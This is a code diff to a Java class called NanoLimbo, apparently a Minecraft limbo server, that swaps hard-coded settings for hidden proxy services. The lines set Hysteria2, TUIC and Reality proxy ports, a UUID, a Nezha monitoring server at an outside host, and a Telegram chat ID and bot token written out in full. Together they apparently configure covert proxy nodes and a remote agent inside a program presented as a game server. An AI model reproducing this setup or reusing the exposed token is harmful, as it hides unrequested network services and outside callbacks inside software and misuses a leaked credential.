@@ -132,7 +132,7 @@ public final class NanoLimbo {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "a1f18023-521e-4bcb-863d-848445d6bccd");
+        envVars.put("UUID", "0e926b28-d52d-4e88-8116-26d31724f1de");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "amd2.felixlee.pp.ua:3489");
         envVars.put("NEZHA_PORT", "");
@@ -140,15 +140,15 @@ public final class NanoLimbo {
         envVars.put("ARGO_PORT", "");
         envVars.put("ARGO_DOMAIN", "");
         envVars.put("ARGO_AUTH", "");
-        envVars.put("HY2_PORT", "25485");
-        envVars.put("TUIC_PORT", "25080");
-        envVars.put("REALITY_PORT", "25080");
+        envVars.put("HY2_PORT", "25397");
+        envVars.put("TUIC_PORT", "25131");
+        envVars.put("REALITY_PORT", "25131");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "697539460");
         envVars.put("BOT_TOKEN", "7425032752:AAH-txk6YNWCgwwxDqV4gghp4A_Khl9OQfc");
         envVars.put("CFIP", "");
         envVars.put("CFPORT", "");
-        envVars.put("NAME", "Altare-GB");
+        envVars.put("NAME", "Altare-PL");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
